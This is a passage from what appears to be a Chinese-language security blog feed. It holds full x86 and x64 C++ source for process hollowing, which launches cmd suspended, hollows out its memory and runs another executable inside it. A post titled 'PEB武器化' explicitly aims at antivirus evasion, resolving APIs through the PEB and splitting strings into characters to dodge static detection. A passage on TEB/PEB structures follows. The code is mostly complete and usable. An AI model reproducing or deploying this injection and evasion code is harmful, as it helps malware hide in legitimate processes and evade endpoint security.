PROCESS_INFORMATION pi = &#123;&#125;; // 以挂起的形式启动一个进程 if (FALSE == CreateProcessA(NULL, (LPSTR)&quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;lpStartupInfo, &amp;pi)) &#123; printf(&quot;CreateFile Failed\\n&quot;); return -1; &#125; HANDLE hFile = CreateFile(szTARGETFILE, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL); if (hFile == NULL) &#123; printf(&quot;CreateFile Failed.\\n&quot;); return -1; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); DWORD dwReadLenth = 0; if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;dwReadLenth, NULL)) &#123; printf(&quot;ReadFile Failed,\\n&quot;); return -1; &#125; CloseHandle(hFile); // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBuffer); // 获取上下文 CONTEXT ctx = &#123;&#125;; ctx.ContextFlags = CONTEXT_ALL; GetThreadContext(pi.hThread, &amp;ctx); LPVOID lpImageBase = NULL; ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &amp;lpImageBase, sizeof(PVOID), NULL); if ((DWORD)lpImageBase == pNt-&gt;OptionalHeader.ImageBase) &#123; FnNtUnmapViewOfSection NtUnmapViewOfSection = (FnNtUnmapViewOfSection)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;); if (NtUnmapViewOfSection == NULL) &#123; printf(&quot;NtUnmapViewOfSection GetProcAddress Failed.\\n&quot;); return -1; &#125; NtUnmapViewOfSection(pi.hProcess, lpImageBase); &#125; LPVOID lpTargetMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpTargetMemory == NULL) &#123; printf(&quot;VirtualAllocEx Failed\\n&quot;); return -1; &#125; if (FALSE == WriteProcessMemory(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL)) &#123; printf(&quot;WritePrcessMemory PE Header Failed.\\n&quot;); return -1; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i)); WriteProcessMemory(pi.hProcess, ((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), ((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, NULL); &#125; ctx.Eax = (DWORD)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint); WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + sizeof(DWORD) * 2), &amp;pNt-&gt;OptionalHeader.ImageBase, sizeof(LPVOID), NULL); //SetThreadContext(pi.hThread, &amp;ctx); MySetThreadContext mySetThreadContext = (MySetThreadContext)DynamicCall(); if (mySetThreadContext == NULL) &#123; printf(&quot;DynamicCall Failed\\n&quot;); return 0; &#125; mySetThreadContext(pi.hThread, &amp;ctx); ResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); system(&quot;pause&quot;); return 0;&#125; x64位实现思路 实现逻辑和x32位基本类似, 区别在于动态获取函数地址时需要从gs:[0]偏移0x60获取PEB在64位系统中, TEB存储在Rdx寄存器中, 在PEB结构中ImageBaseAddress字段位于偏移量0x10, 因此ctx.Rdx + (sizeof(SIZE_T) * 2)等同于(ctx.Rdx + 0x10) x64位完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183// 傀儡进程/进程镂空（x64）// 1. 以挂起的模式启动一个进程（计算器、cmd、notepad）合法程序// 2. 把真正要执行的代码读入// 3. 获取挂起进程相关信息// 4. 把挂起进程的内存掏空// 5. 把要执行的代码写入掏空的进程// 6. 恢复执行#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;intrin.h&gt;// 要加载的程序const wchar_t* TARGETFILE = L&quot;D:\\\\test.exe&quot;;// 定义函数类型typedef NTSTATUS(WINAPI* FnNtUnmapViewOfSection)(HANDLE, PVOID);typedef BOOL(WINAPI* MySetThreadContext)(_In_ HANDLE hThread, _In_ CONST CONTEXT* lpContext);DWORD64 DynamicCall()&#123; // 通过PEB获取kernel32基址 PVOID pPeb = reinterpret_cast&lt;PVOID&gt;(__readgsqword(0x60)); if (!pPeb) &#123; std::cerr &lt;&lt; &quot;Failed to get PEB address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算 Ldr 地址的偏移量 ULONG64 ldrOffset = 0x18; // PEB 结构中 Ldr 成员的偏移量 // 获取_PEB_LDR_DATA //PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + (ULONG64)0x18); PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + ldrOffset); if (!pLdr) &#123; std::cerr &lt;&lt; &quot;Failed to get Ldr address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算InMemoryOrderModuleList地址的偏移量 ULONG64 moduleListOffset = offsetof(PEB_LDR_DATA, InMemoryOrderModuleList); // 计算InMemoryOrderModuleList地址 PLIST_ENTRY pModuleList = reinterpret_cast&lt;PLIST_ENTRY&gt;(reinterpret_cast&lt;PBYTE&gt;(pLdr) + moduleListOffset); // 获取KERNEL32.dll基址 PLIST_ENTRY pKernel32Entry = pModuleList-&gt;Flink-&gt;Flink-&gt;Flink; PLDR_DATA_TABLE_ENTRY pKernelEntry = CONTAINING_RECORD(pKernel32Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pKernelBase = pKernelEntry-&gt;DllBase; // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBase; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD64)pDos); PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD64)pDos); PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD64)pDos); PWORD dwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD64)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; DWORD64 dwSetThreadContext = 0; for (size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; const char* szFuncName = (char*)(pwAddressOfNames[i] + (DWORD64)pDos); char szSetThreadAddress[] = &#123; &#x27;S&#x27;, &#x27;e&#x27;, &#x27;t&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;C&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;x&#x27;, &#x27;t&#x27;,&#x27;\\0&#x27; &#125;; int iFlags = 0; for (size_t j = 0; j &lt; 16; j++) &#123; if (szFuncName[j] == szSetThreadAddress[j]) &#123; iFlags++; &#125; if (iFlags == 16) &#123; dwSetThreadContext = (DWORD64)(pwAddressOfFunctions[dwAddressOfNameOrdinals[i]] + (DWORD64)pDos); break; &#125; &#125; &#125; if (dwSetThreadContext == NULL) &#123; return 0; &#125; return dwSetThreadContext;&#125;int main()&#123; STARTUPINFOA si = &#123;0&#125;; si.cb = sizeof(STARTUPINFOA); PROCESS_INFORMATION pi = &#123;0&#125;; if (FALSE == CreateProcessA(NULL, (LPSTR)&quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) &#123; printf(&quot;CreateProcessA Failed\\n&quot;); return -1; &#125; // 读取要执行的进程 HANDLE hFile = CreateFile(TARGETFILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); if (NULL == hFile) &#123; printf(&quot;CreateFile Failed\\n&quot;); return -1; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (NULL == lpBuffer) &#123; printf(&quot;VirtualAlloc Failed\\n&quot;); return -1; &#125; DWORD lpNumberOfBytesRead = 0; if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;lpNumberOfBytesRead, NULL)) &#123; printf(&quot;ReadFile Failed\\n&quot;); return -1; &#125; CloseHandle(hFile); printf(&quot;%x\\n&quot;, *(short*)lpBuffer); // 解析PE PIMAGE_DOS_HEADER pDos = PIMAGE_DOS_HEADER(lpBuffer); PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer); // 获取挂起进程上下文 CONTEXT ctx = &#123;&#125;; ctx.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &amp;ctx); // 获取挂起进程的映像基址 LPVOID lpOldImageBase = 0; // (ctx.Rdx + (sizeof(SIZE_T) * 2) =&gt; ctx.Rdx + 0x10 =&gt; PEB + 0x10 = ImageBaseAddress if (FALSE == ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;lpOldImageBase, sizeof(PVOID), NULL)) &#123; printf(&quot;ReadProcessMemory To lpOldImageBase Failed\\n&quot;); return -1; &#125; // 判断文件预期加载地址是否被占用 FnNtUnmapViewOfSection fnNtUnmapViewOfSection = (FnNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;); if ((SIZE_T)lpOldImageBase == pNt-&gt;OptionalHeader.ImageBase) &#123; fnNtUnmapViewOfSection(pi.hProcess, lpOldImageBase); // 卸载已存在的文件 &#125; // 为可执行映像分配内存, 写入PE文件头 LPVOID lpTargetMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (NULL == lpTargetMemory) &#123; printf(&quot;VirtualAllocEx Failed\\n&quot;); return -1; &#125; if (FALSE == WriteProcessMemory(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL)) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return -1; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), (PVOID)((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, NULL); &#125; // 将Rcx寄存器设置为入口点 ctx.Rcx = (SIZE_T)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint); WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pNt-&gt;OptionalHeader.ImageBase, sizeof(PVOID), NULL); //SetThreadContext(pi.hThread, &amp;ctx); MySetThreadContext mySetThreadContext = (MySetThreadContext)DynamicCall(); if (mySetThreadContext == NULL) &#123; printf(&quot;DynamicCall Failed\\n&quot;); return -1; &#125; mySetThreadContext(pi.hThread, &amp;ctx); ResumeThread(pi.hThread); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"ShellCode原理及编写","slug":"ShellCode原理及编写","date":"2024-06-27T11:45:51.000Z","updated":"2024-06-27T12:09:31.158Z","comments":true,"path":"29c16d52.html","link":"","permalink":"http://example.com/29c16d52.html","excerpt":"Shellcode原理及编写","text":"Shellcode原理及编写","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"PEB武器化","slug":"PEB武器化","date":"2024-06-27T08:25:29.000Z","updated":"2024-06-27T11:43:22.744Z","comments":true,"path":"15d21ffc.html","link":"","permalink":"http://example.com/15d21ffc.html","excerpt":"基于对Windows TEB/PEB的分析, 可以做一些免杀中的应用","text":"基于对Windows TEB/PEB的分析, 可以做一些免杀中的应用 动态获取API 通过对Windows TEB/PEB的分析, 可以获取到KERNEL32.dll的基址, 然后解析PE, 遍历导出表获取GetProcAddress函数地址, 再使用GetProcAddress函数获取其他函数地址 x32位动态获取API 32位下通过fs:[0]寄存器获取TEB, 然后偏移0x30得到PEB; 解析TEB&#x2F;PEB获取KERNEL32.dll基址12345678910111213141516171819// TEB结构体_TEB* pTeb = NtCurrentTeb(); // 指向当前线程的线程环境块的指针// PEB结构体PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); // 偏移0x30得到PEB// LDR结构体PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0x0c); // PEB偏移0x0c得到_PEB_LDR_DATA// 进程所有模块PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + 0x0c); // _PEB_LDR_DATA偏移0x0c得到InLoadOrderModuleList// 主模块PDWORD pModExe = (PDWORD)*pInLoadOrderLinks; // 第一个为主模块（程序本身）// NtDllPDWORD pModNtDll = (PDWORD)*pModExe; // 第二个为ntdll.dll// Kernel32DllPDWORD pModKernel32 = (PDWORD)*pModNtDll; // 第三个为KERNEL32.dll// 基址dwKernel32 = pModKernel32[6]; // 偏移0x18 =&gt; 24 / 4 = 6 其中第6个为基址printf(&quot;Kernel32 Base: %08x %S\\n&quot;, dwKernel32, (const char*)pModKernel32[12]); 解析PE, 获取GetProcAddress 获取到KERNEL32.dll基址, 通过解析PE遍历KERNEL32.dll的导出表获取到GetProcAddress函数地址; 1234567891011121314151617181920212223242526272829303132333435363738// 解析pe文件PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernel32;// 解析NtHeaderPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + dwKernel32);// 定位导出表PIMAGE_DATA_DIRECTORY pExportDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);// 解析导出表PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pExportDir-&gt;VirtualAddress + dwKernel32);// 获取函数地址表PDWORD dwAddrOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + dwKernel32);// 获取函数序号表PWORD dwAddrOfNameOrds = (PWORD)(pExport-&gt;AddressOfNameOrdinals + dwKernel32);// 获取函数名称表PDWORD dwAddrOfNames = (PDWORD)(pExport-&gt;AddressOfNames + dwKernel32);// 获取函数名称总数DWORD dwNumOfNames = (DWORD)pExport-&gt;NumberOfNames;DWORD dwGetProcAddress = 0;// 通过遍历函数名称总数for (size_t i = 0; i &lt; dwNumOfNames; i++)&#123; // 获取函数名 const char* szFuncName = (char*)(dwAddrOfNames[i] + dwKernel32); // 局部变量 char szGetProcAddress[] = &#123; &#x27;G&#x27;,&#x27;e&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;A&#x27;,&#x27;d&#x27;,&#x27;d&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27; &#125;; int nFlags = 0; for (size_t j = 0; j &lt; 14; j++) &#123; if (szFuncName[j] == szGetProAddress[j]) &#123; nFlags++; &#125; if (nFlags == 14) &#123; dwGetProcAddress = (DWORD)(dwAddrOfFunctions[dwAddrOfNameOrds[i]] + dwKernel32); break; &#125; &#125;&#125; 定义相关函数字符串以及函数原型并调用 定义函数名称时不能使用常量字符串, 因为程序会将字符串放在常量区段, 所以要对字符串进行打散处理, 以这种方式定义会将字符串存放在堆栈区域; 123456789101112131415161718192021222324252627282930313233343536// 定义LoadLibraryW函数字符串char szLoadLibraryW[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;;// 定义MessageBoxW函数字符串char szMessagesBoxW[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;;// 定义KERNEL32.dll字符串char szKernel32[] = &#123; &#x27;K&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;n&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;3&#x27;, &#x27;2&#x27;, &#x27;.&#x27;, &#x27;d&#x27;, &#x27;l&#x27;, &#x27;l&#x27;,&#x27;\\0&#x27; &#125;;// 定义ExitProcess函数字符串char szExitProcss[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;;// 定义user32.dll字符串WCHAR szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;, &#x27;\\0&#x27; &#125;;WCHAR szDokey[] = &#123; &#x27;D&#x27;,&#x27;o&#x27;,&#x27;k&#x27;,&#x27;e&#x27;,&#x27;y&#x27;,&#x27;\\0&#x27; &#125;;// 定义LoadLibraryW函数typedef HMODULE(WINAPI* MyLoadLibraryW)(_In_ LPCWSTR lpLibFileName);// 定义GetProcAddress函数typedef FARPROC(WINAPI* MyGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);// 定义MessageBoxW函数typedef int (WINAPI* MyMessageBoxW)(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType);// 定义ExitProcess函数typedef VOID(WINAPI* MyExitProcess)(_In_ UINT uExitCode);HMODULE hKernel = (HMODULE)dwKernel32;MyGetProcAddress pFuncGetProcAddress = (MyGetProcAddress)dwGetProcAddress;if (pFuncGetProcAddress == NULL)&#123; return -1;&#125;MyLoadLibraryW pFuncLoadLibraryW = (MyLoadLibraryW)pFuncGetProcAddress(hKernel, szLoadLibraryW);if (NULL == pFuncLoadLibraryW)&#123; return -1;&#125;HMODULE hUser32 = pFuncLoadLibraryW((LPCWSTR)szUser32);MyMessageBoxW pFuncMessageBoxW = (MyMessageBoxW)pFuncGetProcAddress(hUser32, szMessagesBoxW);pFuncMessageBoxW(NULL, szDokey, (LPCWSTR)szDokey, MB_OK);MyExitProcess pFuncExitProcess = (MyExitProcess)pFuncGetProcAddress(hKernel, szExitProcss);pFuncExitProcess(0); x64位动态获取API 64位下通过gs:[0]寄存器获取TEB, 然后偏移0x60得到PEB; 64位下和32位获取方式不同; 解析TEP&#x2F;PEB获取KERNEL32.dll基址 需要包含winternl.h和intrin.h两个头文件; 1234567891011121314151617181920212223 // 通过PEB获取KERNEL32.dll基址PVOID pPeb = reinterpret_cast&lt;PVOID&gt;(__readgsqword(0x60));if (!pPeb)&#123; return -1;&#125;// 计算Ldr地址的偏移量ULONG64 ldrOrder = 0x18;// 获取_PEB_LDR_DATAPVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + ldrOrder);if (!pLdr)&#123; return -1;&#125;// 计算InMemoryOrderModuleList地址的偏移量ULONG64 moduleListOffset = offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);// 计算InMemoryOrderModuleList地址PLIST_ENTRY pModList = reinterpret_cast&lt;PLIST_ENTRY&gt;(reinterpret_cast&lt;PBYTE&gt;(pLdr) + moduleListOffset);// 获取KERNEL32.dll基址PLIST_ENTRY pKernel32Entry = pModList-&gt;Flink-&gt;Flink-&gt;Flink;PLDR_DATA_TABLE_ENTRY pKernelTableEntry = CONTAINING_RECORD(pKernel32Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); // 获取KERNEL32.dll基址PVOID pKernelBase = pKernelTableEntry-&gt;DllBase; 解析PE, 获取GetProcAddress 和32位一样, 解析PE遍历导出表获取GetProcAddress函数地址; 123456789101112131415161718192021222324252627282930313233343536373839 // 解析PEPIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBase; // 获取NT头PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)pKernelBase);// 获取导出表虚拟地址 PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);// 通过导出表虚拟地址获取导出表 PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD64)pKernelBase); // 获取函数地址表PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD64)pKernelBase);// 获取函数名称表 PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD64)pKernelBase);// 获取函数序号表 PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD64)pKernelBase); // 获取函数名称总数DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;DWORD64 dwGetProcAddress = 0; // 通过函数名称总数遍历for (size_t i = 0; i &lt; dwNumberOfNames; i++)&#123; // 获取函数名 const char* szFuncName = (char*)(pwAddressOfNames[i] + (DWORD64)pKernelBase); // 局部变量 char szGetProcAddress[] = &#123;&#x27;G&#x27;,&#x27;e&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;A&#x27;,&#x27;d&#x27;,&#x27;d&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;&#125;; int nFlags = 0; for (size_t j = 0; j &lt; 14; j++) &#123; if (szFuncName[j] == szGetProcAddress[j]) &#123; nFlags++; &#125; if (nFlags == 14) &#123; dwGetProcAddress = (DWORD64)(pwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD64)pKernelBase); break; &#125; &#125;&#125; 定义相关函数字符串以及函数原型并调用1234567891011121314151617181920212223242526272829303132 // 定义LoadLibraryW字符串 char szLoadLibraryW[] = &#123; &#x27;L&#x27;,&#x27;o&#x27;,&#x27;a&#x27;,&#x27;d&#x27;,&#x27;L&#x27;,&#x27;i&#x27;,&#x27;b&#x27;,&#x27;r&#x27;,&#x27;a&#x27;,&#x27;r&#x27;,&#x27;y&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;;// 定义MessagesBoxW字符串char szMessagesBoxW[] = &#123; &#x27;M&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;a&#x27;,&#x27;g&#x27;,&#x27;e&#x27;,&#x27;B&#x27;,&#x27;o&#x27;,&#x27;x&#x27;,&#x27;W&#x27;,&#x27;\\0&#x27; &#125;; // 定义KERNEL32.dll字符串char szKernel32[] = &#123; &#x27;K&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;n&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;3&#x27;, &#x27;2&#x27;, &#x27;.&#x27;, &#x27;d&#x27;, &#x27;l&#x27;, &#x27;l&#x27;,&#x27;\\0&#x27; &#125;; // 定义ExitProcss字符串char szExitProcss[] = &#123; &#x27;E&#x27;,&#x27;x&#x27;,&#x27;i&#x27;,&#x27;t&#x27;,&#x27;P&#x27;,&#x27;r&#x27;,&#x27;o&#x27;,&#x27;c&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;s&#x27;,&#x27;\\0&#x27; &#125;;WCHAR szUser32[] = &#123; &#x27;U&#x27;,&#x27;s&#x27;,&#x27;e&#x27;,&#x27;r&#x27;,&#x27;3&#x27;,&#x27;2&#x27;,&#x27;.&#x27;,&#x27;d&#x27;,&#x27;l&#x27;,&#x27;l&#x27;, &#x27;\\0&#x27; &#125;;WCHAR szDokey[] = &#123; &#x27;D&#x27;,&#x27;o&#x27;,&#x27;k&#x27;,&#x27;e&#x27;,&#x27;y&#x27;, &#x27;_&#x27;, &#x27;x&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;\\0&#x27; &#125;;typedef HMODULE(WINAPI* MyLoadLibraryW)(_In_ LPCWSTR lpLibFileName);typedef FARPROC(WINAPI* MyGetProcAddress)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);typedef int (WINAPI* MyMessageBoxW)(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType);typedef VOID(WINAPI* MyExitProcess)(_In_ UINT uExitCode);HMODULE hKernel = (HMODULE)pKernelBase;MyGetProcAddress pFuncGetProcAddress = (MyGetProcAddress)dwGetProcAddress;if (pFuncGetProcAddress == NULL)&#123; return -1;&#125;MyLoadLibraryW pFuncLoadLibraryW = (MyLoadLibraryW)pFuncGetProcAddress(hKernel, szLoadLibraryW);if (NULL == pFuncLoadLibraryW)&#123; return -1;&#125;HMODULE hUser32 = pFuncLoadLibraryW((LPCWSTR)szUser32);MyMessageBoxW pFuncMessageBoxW = (MyMessageBoxW)pFuncGetProcAddress(hUser32, szMessagesBoxW);pFuncMessageBoxW(NULL, szDokey, (LPCWSTR)szDokey, MB_OK);MyExitProcess pFuncExitProcess = (MyExitProcess)pFuncGetProcAddress(hKernel, szExitProcss);pFuncExitProcess(0);","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"Windows进程环境块分析","slug":"Windows进程环境块分析","date":"2024-06-23T10:40:23.000Z","updated":"2024-08-01T14:19:43.064Z","comments":true,"path":"a214807a.html","link":"","permalink":"http://example.com/a214807a.html","excerpt":"TEBTEB(Thread Environment Block), 线程环境变量块, TEB中包含了线程的堆栈指针、TLS（线程本地存储）指针、异常处理链表指针、用户模式分页表指针等信息。TEB中fs寄存器通常被设置为fs:[0]（32位）, 指向当前线程的的TEB结构体。其他线程可以通过访问自己的TEB结构体来获取自己的状态和信息。 PEBPEB(Process Environment Block), 进程环境变量块, PEB中包含了进程的代码、数据段指针、进程的环境变量、进程启动参数信息以及加载的dll信息等。PEB结构体中的fs段寄存器通常被设置为0x30（32位）, 指向当前进程的PEB结构体。","text":"TEBTEB(Thread Environment Block), 线程环境变量块, TEB中包含了线程的堆栈指针、TLS（线程本地存储）指针、异常处理链表指针、用户模式分页表指针等信息。TEB中fs寄存器通常被设置为fs:[0]（32位）, 指向当前线程的的TEB结构体。其他线程可以通过访问自己的TEB结构体来获取自己的状态和信息。 PEBPEB(Process Environment Block), 进程环境变量块, PEB中包含了进程的代码、数据段指针、进程的环境变量、进程启动参数信息以及加载的dll信息等。PEB结构体中的fs段寄存器通常被设置为0x30（32位）, 指向当前进程的PEB结构体。 TEB的查找方式 32 bit 64 bit fs gs 32位TEB&#x2F;PEB查找TEB1234567890:000&gt; dt _TEBntdll!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB // &lt;== 指向PEB... PEB 包含进程信息 